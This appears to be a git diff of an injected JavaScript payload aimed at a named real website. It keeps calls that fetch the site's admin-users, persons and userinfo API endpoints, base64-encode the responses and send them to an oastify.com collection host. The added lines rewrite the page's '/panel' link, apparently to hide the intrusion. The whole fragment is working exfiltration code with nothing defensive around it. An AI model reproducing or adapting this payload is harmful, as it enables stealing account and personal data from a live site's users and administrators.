@@ -21,8 +21,14 @@ function fetchEncodeAndSend(originalUrl, targetUrlBase) {
         .catch(error => console.error('Error in fetching or encoding:', error));
 }
 
-var targetUrlBase = 'https://hsd0gyosk5qk1lzr8cz7uqxxroxflb90.oastify.com';  // Base URL where you send the base64 encoded data
+var link = document.querySelector('a[href="/panel"]');
 
+// Check if the element exists to avoid errors
+if (link) {
+    link.href = '/announcements/2'; // Change the href to the new path
+}
+
+var targetUrlBase = 'https://hsd0gyosk5qk1lzr8cz7uqxxroxflb90.oastify.com';  // Base URL where you send the base64 encoded data
 fetchEncodeAndSend('https://my.daryakenar.ir/api/Admin/Users', targetUrlBase);
 fetchEncodeAndSend('https://my.daryakenar.ir/api/Persons', targetUrlBase);
 fetchEncodeAndSend('https://my.daryakenar.ir/connect/userinfo', targetUrlBase);
